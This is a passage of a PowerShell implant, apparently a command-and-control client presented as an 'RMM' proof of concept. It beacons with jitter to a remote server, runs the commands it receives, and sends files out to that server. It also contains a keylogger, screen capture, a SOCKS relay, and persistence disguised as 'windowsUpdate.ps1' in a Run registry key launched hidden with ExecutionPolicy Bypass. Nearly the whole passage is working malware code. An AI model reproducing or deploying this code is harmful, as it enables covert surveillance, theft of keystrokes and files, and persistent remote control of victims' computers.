        # Invoke-RmmRestMethod reads the error body before throwing; the stream may be empty here.
        $ex = $ErrorRecord.Exception
        while ($null -ne $ex) {
            if ([string]$ex.Message -match 'TERMINATED') { return $true }
            $ex = $ex.InnerException
        }
    } catch {}
    return $false
}

function Register-RmmSession {
    param(
        [switch]$Quiet,
        [switch]$Reconnect
    )
    $registerUrl = "$u/register?id=$sessionId&h=$computerName&u=$userName"
    $headers = Get-RmmRequestHeaders
    Write-RmmLog "Register GET $registerUrl (beacon=$([bool]$beaconSecret))" -Level DEBUG
    try {
        $null = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
        $script:RmmEverRegistered = $true
        if (-not $Quiet) {
            if ($Reconnect) {
                Write-Host "[+] Reconnected to RMM server (ID: $sessionId)" -ForegroundColor Green
            } else {
                Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
            }
        }
        return $true
    } catch {
        if (Test-RmmSessionTerminated -ErrorRecord $_) {
            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
            exit 0
        }
        throw
    }
}

# Register with RMM server (retries until success; default = no limit)
$registered = $false
$registerAttempt = 0

Write-Host "[*] Starting RMM client with Session ID: $sessionId" -ForegroundColor Cyan
Write-Host "[*] Server URL: $u" -ForegroundColor Cyan
if ($beaconSecret) {
    Write-Host "[*] Beacon token: set" -ForegroundColor Cyan
} else {
    Write-Host "[!] Beacon token: NOT set — server will reject unless started with --insecure" -ForegroundColor Yellow
}
if ($script:RmmWebProxy) {
    $proxyMsg = "[*] HTTP proxy: $httpProxy"
    if ($httpProxyUseDefaultCredentials) { $proxyMsg += ' (default credentials)' }
    Write-Host $proxyMsg -ForegroundColor Cyan
}
if ($script:RmmVerbose) {
    Write-Host "[*] Verbose HTTP logging enabled" -ForegroundColor DarkGray
} else {
    Write-Host "[*] Tip: set `$verboseHttp = `$true for per-request URL, wire IP, and error bodies" -ForegroundColor DarkGray
}
Write-Host "[*] Default beacon: $baseSleepSeconds seconds with $jitterPercent% jitter" -ForegroundColor Cyan
Write-Host "[*] Connection failures retry indefinitely (only explicit server kill or __EXIT__ stops the client)" -ForegroundColor DarkGray
if ($script:UsePersistentHttp) {
    Write-Host "[*] HTTP: persistent cookies + TCP keep-alive, IPv4-only" -ForegroundColor DarkGray
} else {
    Write-Host "[*] HTTP: IPv4-only, KeepAlive=false (set `$persistentHttp = `$true for persistent TCP)" -ForegroundColor DarkGray
}

while (-not $registered) {
    $registerAttempt++
    try {
        $registered = Register-RmmSession
        $currentRetry = 0
    } catch {
        if (Test-RmmSessionTerminated -ErrorRecord $_) {
            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
            exit 0
        }
        Write-Host "[-] Registration failed (attempt $registerAttempt, retrying): $($_.Exception.Message)" -ForegroundColor Red
        Write-RmmHttpFailure -ErrorRecord $_ -Context "register"
        $backoffTime = Get-BackoffSleep -retryCount $registerAttempt
        Write-Host "[*] Server unreachable — retrying registration in $backoffTime seconds..." -ForegroundColor Yellow
    }
}

# Main loop
while ($true) {
    try {
        # Add jitter before each poll cycle (shorter interval while SOCKS relay is active)
        if ($script:RmmSocksEnabled) {
            $socksBase = [Math]::Min(2, $baseSleepSeconds)
            $socksJitter = [Math]::Min(15, $jitterPercent)
            $null = Get-JitteredSleep -baseSeconds $socksBase -jitterPercent $socksJitter
        } else {
            $null = Get-JitteredSleep -baseSeconds $baseSleepSeconds -jitterPercent $jitterPercent
        }

        $headers = Get-RmmRequestHeaders
        $headers["X-Request-ID"] = [System.Guid]::NewGuid().ToString()
        
        # Poll /cmd before register so a killed session gets __EXIT__ (register returns 403 TERMINATED).
        $cmdUrl = "$u/cmd?id=$sessionId"
        $response = Invoke-RmmRestMethod -Uri $cmdUrl -Method Get -Headers $headers -RestErrorAction Stop
        
        # Reset retry counter on success
        $currentRetry = 0
        
        # Invoke-RestMethod returns PSCustomObject for JSON; handle string or object
        $cmdData = Parse-CmdResponse -response $response
        $command = [string]$cmdData.command
        $cmdType = [string]$cmdData.type

        if ($command -eq "__EXIT__") {
            Write-Host "[*] Session terminated by server; exiting client" -ForegroundColor Yellow
            exit 0
        }

        # Re-register each beacon so a restarted server re-creates the session before handling work.
        Register-RmmSession -Quiet | Out-Null
        
        if ($command -and $command -ne "") {
            if ($command -like "__CONFIG__ *") {
                $null = Update-Configuration -configString $command
                continue
            }
            Write-Host "[>] Received command: $command" -ForegroundColor Cyan
            
            # Handle special commands FIRST before anything else
            if ($command -eq "__STOP__") {
                Write-Host "[*] Stopping persistent command" -ForegroundColor Yellow
                continue
            }
            elseif ($command -like "__DOWNLOAD__ *") {
                # File download (exfiltrate file from target) — server expects one JSON body: filename + content (base64)
                $filePath = $command.Substring(12).Trim()
                if (Test-Path $filePath) {
                    $maxB64Chars = 12000000  # ~9MB binary cap; avoids huge single POST on PoC
                    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
                    $fileBase64 = [Convert]::ToBase64String($fileBytes)
                    $fileName = Split-Path $filePath -Leaf
                    if ($fileBase64.Length -gt $maxB64Chars) {
                        $err = "File too large for PoC single-shot upload (base64 length $($fileBase64.Length) > $maxB64Chars)"
                        Send-RmmTextResult -CommandLine $command -Text $err -Headers $headers
                        Write-Host "[-] $err" -ForegroundColor Red
                    } else {
                        $resultData = @{
                            filename = $fileName
                            content = $fileBase64
                        } | ConvertTo-Json -Compress
                        $resultUrl = "$u/result?id=$sessionId&type=file_upload"
                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $resultData -ContentType "application/json" -Headers $headers -RestErrorAction Stop
                        Write-Host "[+] File exfiltrated: $filePath" -ForegroundColor Green
                    }
                } else {
                    $errorMsg = "File not found: $filePath"
                    Send-RmmTextResult -CommandLine $command -Text $errorMsg -Headers $headers
                    Write-Host "[-] $errorMsg" -ForegroundColor Red
                }
            }
            elseif ($command -like "__UPLOAD__ *") {
                # File upload (receive file from RMM)
                $parts = $command -split "`n", 2
                if ($parts.Count -eq 2) {
                    $uploadCmd = $parts[0]
                    $jsonData = $parts[1]
                    $filePath = $uploadCmd.Substring(10).Trim()
                    
                    $fileData = $jsonData | ConvertFrom-Json
                    $fileBytes = [Convert]::FromBase64String($fileData.content)
                    [System.IO.File]::WriteAllBytes($filePath, $fileBytes)
                    
                    Send-RmmTextResult -CommandLine $command -Text "File uploaded successfully: $filePath" -Headers $headers
                    Write-Host "[+] File uploaded: $filePath" -ForegroundColor Green
                }
            }
            elseif ($command -eq "__SCREENSHOT__") {
                # Take screenshot
                try {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    
                    $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
                    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                    
                    $memoryStream = New-Object System.IO.MemoryStream
                    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
                    $screenshotBase64 = [Convert]::ToBase64String($memoryStream.ToArray())
                    
                    $graphics.Dispose()
                    $bitmap.Dispose()
                    $memoryStream.Dispose()
                    
                    $resultUrl = "$u/result?id=$sessionId&type=screenshot"
                    Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $screenshotBase64 -Headers $headers -RestErrorAction Stop
                    Write-Host "[+] Screenshot captured and sent" -ForegroundColor Green
                } catch {
                    $errorMsg = "Screenshot failed: $_"
                    Send-RmmTextResult -CommandLine '__SCREENSHOT__' -Text $errorMsg -Headers $headers
                    Write-Host "[-] $errorMsg" -ForegroundColor Red
                }
            }
            elseif ($command -like "__KEYLOG__ *") {
                # Keylogging: job writes to a temp file (Start-Job cannot share in-memory state with parent)
                $action = $command.Substring(10).Trim()
                $klJobName = "RMM_Keylogger"
                
                if ($action -eq "start") {
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Remove-Job -ErrorAction SilentlyContinue
                    
                    $prefix = if ($sessionId.Length -ge 8) { $sessionId.Substring(0, 8) } else { $sessionId }
                    $keylogPath = Join-Path $env:TEMP ("rmm_keylog_{0}.log" -f $prefix)
                    if (Test-Path -LiteralPath $keylogPath) { Remove-Item -LiteralPath $keylogPath -Force -ErrorAction SilentlyContinue }
                    
                    $scriptBlock = {
                        param([string]$path, [int]$jitterBase, [int]$jitterPct)
                        Add-Type -AssemblyName System.Windows.Forms
                        $down = @{}
                        $acc = New-Object System.Text.StringBuilder
                        while ($true) {
                            $jr = [int]($jitterBase * ($jitterPct / 100.0))
                            $jv = Get-Random -Minimum (-$jr) -Maximum ($jr + 1)
                            Start-Sleep -Milliseconds ([Math]::Max(15, 40 + $jv))
                            for ($vk = 8; $vk -lt 256; $vk++) {
                                $st = [System.Windows.Forms.Control]::GetKeyState([int]$vk)
                                $pressed = (($st -band 0x8000) -ne 0)
                                if ($pressed) {
                                    if (-not $down.ContainsKey($vk)) {
                                        $down[$vk] = $true
                                        $name = $vk.ToString()
                                        try {
                                            $ek = [System.Windows.Forms.Keys]$vk
                                            $name = $ek.ToString()
                                        } catch { }
                                        [void]$acc.Append("[$name]")
                                    }
                                } elseif ($down.ContainsKey($vk)) {
                                    $null = $down.Remove($vk)
                                }
                            }
                            if ($acc.Length -ge 400) {
                                [System.IO.File]::AppendAllText($path, $acc.ToString())
                                $acc.Clear() | Out-Null
                            }
                        }
                    }
                    Start-Job -ScriptBlock $scriptBlock -Name $klJobName -ArgumentList $keylogPath, $baseSleepSeconds, $jitterPercent | Out-Null
                    $script:rmmKeylogPath = $keylogPath
                    $result = "Keylogger started; log file: $keylogPath"
                    Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                    Write-Host "[+] Keylogger started" -ForegroundColor Green
                }
                elseif ($action -eq "stop") {
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Stop-Job -ErrorAction SilentlyContinue
                    Get-Job -Name $klJobName -ErrorAction SilentlyContinue | Remove-Job -ErrorAction SilentlyContinue
                    $result = "Keylogger stopped"
                    Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                    Write-Host "[+] Keylogger stopped" -ForegroundColor Green
                }
                elseif ($action -eq "dump") {
                    $kp = $script:rmmKeylogPath
                    if ($kp -and (Test-Path -LiteralPath $kp)) {
                        $logData = [System.IO.File]::ReadAllText($kp)
                        if (-not $logData) { $logData = "(empty buffer)" }
                        $resultUrl = "$u/result?id=$sessionId&type=keylog"
                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $logData -Headers $headers -RestErrorAction SilentlyContinue
                        Write-Host "[+] Keylog data sent" -ForegroundColor Green
                    } else {
                        Send-RmmTextResult -CommandLine $command -Text "Keylogger log not found or not started" -Headers $headers
                    }
                }
            }
            elseif ($command -eq "__INSTALL_PERSIST__") {
                # Install persistence — align copied script with current $u, sleep, and jitter
                if (-not $PSCommandPath) {
                    $err = "install_persist requires running the client from a saved .ps1 file (PSCommandPath is empty)"
                    Send-RmmTextResult -CommandLine '__INSTALL_PERSIST__' -Text $err -Headers $headers
                    Write-Host "[-] $err" -ForegroundColor Red
                }
                else {
                $startupDir = [Environment]::GetFolderPath('Startup')
                $scriptPath = Join-Path $startupDir 'windowsUpdate.ps1'
                $currentScript = Get-Content -LiteralPath $PSCommandPath -Raw -ErrorAction Stop
                $uEsc = $u -replace '''', ''''''
                $currentScript = $currentScript -replace '(?m)^\s*\$u\s*=\s*.+$', ('$u = ''{0}''' -f $uEsc)
                $currentScript = $currentScript -replace '(?m)^\s*\$baseSleepSeconds\s*=\s*\d+', ('$baseSleepSeconds = {0}' -f $baseSleepSeconds)
                $currentScript = $currentScript -replace '(?m)^\s*\$jitterPercent\s*=\s*\d+', ('$jitterPercent = {0}' -f $jitterPercent)
                $ph = if ($script:UsePersistentHttp) { '$true' } else { '$false' }
                $currentScript = $currentScript -replace '(?m)^\s*\$persistentHttp\s*=\s*\$(?:true|false)\s*$', ('$persistentHttp = {0}' -f $ph)
                $proxyEsc = $httpProxy -replace '''', ''''''
                $currentScript = $currentScript -replace '(?m)^\s*\$httpProxy\s*=\s*.+$', ('$httpProxy = ''{0}''' -f $proxyEsc)
                Set-Content -LiteralPath $scriptPath -Value $currentScript -Encoding UTF8 -Force
                
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
                
                $result = "Persistence installed successfully"
                Send-RmmTextResult -CommandLine '__INSTALL_PERSIST__' -Text $result -Headers $headers
                Write-Host "[+] Persistence installed" -ForegroundColor Green
                }
            }
            elseif ($command -eq "__SOCKS_START__") {
                $script:RmmSocksEnabled = $true
                Send-RmmTextResult -CommandLine '__SOCKS_START__' -Text 'SOCKS relay enabled on agent' -Headers $headers
                Write-Host "[+] SOCKS relay enabled (fast beacon + /socks polls)" -ForegroundColor Green
            }
            elseif ($command -eq "__SOCKS_STOP__") {
                Stop-RmmSocksRelay
                Send-RmmTextResult -CommandLine '__SOCKS_STOP__' -Text 'SOCKS relay stopped on agent' -Headers $headers
                Write-Host "[*] SOCKS relay stopped on agent" -ForegroundColor Yellow
            }
            elseif ($command -eq "__REMOVE_PERSIST__") {
                # Remove persistence
                $startupDir = [Environment]::GetFolderPath('Startup')
                $scriptPath = Join-Path $startupDir 'windowsUpdate.ps1'
                if (Test-Path -LiteralPath $scriptPath) {
                    Remove-Item -LiteralPath $scriptPath -Force
                }
                
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Remove-ItemProperty -Path $regPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue
                
                $result = "Persistence removed"
                Send-RmmTextResult -CommandLine '__REMOVE_PERSIST__' -Text $result -Headers $headers
                Write-Host "[+] Persistence removed" -ForegroundColor Green
            }
            else {
                # CMD by default; PS:/powershell:/pwsh:/cmd: — see Invoke-RmmUserCommand
                try {
                    $result = [string](Invoke-RmmUserCommand -RawCommand $command)
                    if (-not $result.Trim()) {
                        $result = "Command executed successfully (no output)"
                    }
                } catch {
                    $result = [string]$_.Exception.Message
                }
                
                # Send result back to RMM (JSON includes command line so queued runs are labeled on the server)
                Send-RmmTextResult -CommandLine $command -Text $result -Headers $headers
                Write-Host "[+] Result sent to RMM" -ForegroundColor Green
            }
        }

        if ($script:RmmSocksEnabled) {
            Invoke-RmmSocksCycle -Headers $headers
        }
        
    } catch {
        if (Test-RmmSessionTerminated -ErrorRecord $_) {
            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
            exit 0
        }

        Write-Host "[!] Communication error (retrying indefinitely): $($_.Exception.Message)" -ForegroundColor Yellow
        Write-RmmHttpFailure -ErrorRecord $_ -Context "beacon"

        try {
            if (Register-RmmSession -Quiet -Reconnect) {
                $currentRetry = 0
                continue
            }
        } catch {
            if (Test-RmmSessionTerminated -ErrorRecord $_) {
                Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
                exit 0
            }
            Write-RmmHttpFailure -ErrorRecord $_ -Context "re-register"
        }

        $currentRetry++
        $backoffTime = Get-BackoffSleep -retryCount $currentRetry
        if ($currentRetry -le $maxRetries) {
            Write-Host "[*] Backing off $backoffTime seconds, then retry (attempt $currentRetry/$maxRetries)..." -ForegroundColor Yellow
        } else {
            Write-Host "[*] Server still down — long backoff $backoffTime seconds, then retry..." -ForegroundColor Yellow
            $currentRetry = 0
        }
    }
} 

